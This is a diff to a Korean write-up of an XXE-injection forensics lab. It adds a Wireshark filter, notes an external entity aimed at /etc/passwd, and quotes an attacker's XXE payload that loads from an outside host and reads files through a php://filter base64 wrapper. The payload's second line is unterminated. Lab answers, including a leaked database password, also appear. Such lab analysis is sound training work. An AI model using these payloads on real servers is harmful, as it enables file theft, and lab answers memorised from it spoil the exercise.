@@ -51,6 +51,10 @@ ip `210.106.114.183` 에서 포트 스캐닝을 진행하고 있는 것 같다. 
 
 ![XXE_Infiltration_Q1_2.png](./IMG/XXE_Infiltration_Q1_2.png)
 
+포트 스캐닝을 통해 열려있는 서버를 탐지한 패킷을 찾기 위해 와이어 샤크에서 아래 필터링을 사용할 수 있다.
+
+필터링: `tcp.flags.syn == 1 && tcp.flags.ack == 1`
+
 이후 80, 3306 포트가 공격 대상이 된 것으로 보인다.
 
 3306은 MySQL 기본 포트이다.
@@ -88,6 +92,8 @@ TheGreatGatsby.xml
 첫 번째로 업로드한 파일의 이름은 `TheGreatGatsby.xml`이다.
 
 ![XXE_Infiltration_Q2_3.png](./IMG/XXE_Infiltration_Q2_3.png)
+
+DOCTYPE 선언을 활용하여 시스템 파일 /etc/passwd를 가리키는 external entity를 정의했다.
 
 ## Q4
 Understanding which sensitive files were accessed helps evaluate the breach's potential impact. What's the name of the web app configuration file the attacker read?
@@ -127,7 +133,7 @@ To assess the scope of the breach, what is the password for the compromised data
 Winter2024
 
 ### 분석
-`config.php`에서 계정 정보들이 유출됐다.
+`config.php`에서 데이터베이스 계정 정보들이 유출됐다.
 
 ![XXE_Infiltration_Q5_1.png](./IMG/XXE_Infiltration_Q5_1.png)
 
@@ -169,6 +175,11 @@ booking.php
 
 ![XXE_Infiltration_Q4_7.png](./IMG/XXE_Infiltration_Q4_7.png)
 ![XXE_Infiltration_Q4_8.png](./IMG/XXE_Infiltration_Q4_8.png)
+
+```
+<!ENTITY % payload SYSTEM "http://203.0.113.15/booking.php">
+<!ENTITY % internals "<!ENTITY file SYSTEM 'php://filter/read=convert.base64-encode/resource=%payload;'>
+```
 
 ### 마무리
 XXE 공격, MySQL 접속 방식 (패킷), 핸드쉐이크 (패킷) 학습 필요
